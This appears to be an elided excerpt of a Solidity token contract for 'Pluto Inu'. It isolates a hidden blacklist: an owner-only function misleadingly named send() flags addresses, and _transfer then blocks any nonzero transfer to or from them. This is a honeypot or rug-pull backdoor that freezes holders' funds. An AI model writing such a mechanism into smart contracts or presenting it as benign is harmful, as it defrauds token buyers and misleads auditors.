...
contract PlutoToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _send;
    ...
    string private _name = 'Pluto Inu';
    ...
    function checkSend(address _address) public view returns (bool) {
        return _send[_address];
    }
    
    function send(address account) external onlyOwner() {
        _send[account] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_send[sender] || _send[recipient])
        require(amount == 0, "");
